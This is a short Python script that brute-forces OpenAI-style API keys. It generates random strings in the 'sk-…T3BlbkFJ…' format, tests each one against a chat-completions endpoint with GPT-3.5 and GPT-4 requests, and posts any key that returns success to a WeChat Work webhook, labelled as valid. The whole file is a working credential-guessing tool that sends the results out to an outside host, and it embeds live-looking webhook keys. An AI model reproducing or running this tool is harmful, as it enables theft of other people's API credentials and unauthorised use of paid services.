import requests
import string
from random import choice as ci
from random import randint as rd
SS=string.ascii_letters+string.digits
url="https://api.zhtwinkle.cn/v1/chat/completions"
bot="https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=9848af67-323c-4bdb-800e-8f4eb48d382a"
bot2="https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=1b3989e7-efb6-4520-b6f3-1c22d50300e2"
json1={
     "model":"gpt-3.5-turbo",
     "messages": [
           {"role": "system", "content": "You are a virtual assistant."},
           {"role": "user", "content": "test"}
       ],
     "max_tokens": 7,
     "temperature": 0
}
json2={
     "model":"gpt-4",
     "messages": [
           {"role": "system", "content": "You are a virtual assistant."},
           {"role": "user", "content": "test"}
       ],
     "max_tokens": 7,
     "temperature": 0
}
def f(apiKey):

    headers = {
              "Authorization": "Bearer " + apiKey,
              "Content-Type": "application/json"
    }

    re1=requests.post(url=url,headers=headers,json=json1)
    re2=requests.post(url=url,headers=headers,json=json2)
    return re1.status_code==200 or re2.status_code==200

def g20():
    ans=""
    for i in range(20):
        ans+=ci(SS)
    return ans
def send(Key,st,bo):
    json={
        "msgtype":"text",
        "text":{"content":Key+"\n"+st}
    }
    requests.post(url=bo,json=json)
while True:
    x=rd(1,1000)
    Key="sk-"+g20()+"T3BlbkFJ"+g20()
    if f(Key):
        st="合法"
        send(Key,st,bot)
    if x==1:
        send(Key,"测试-小号",bot2)
    
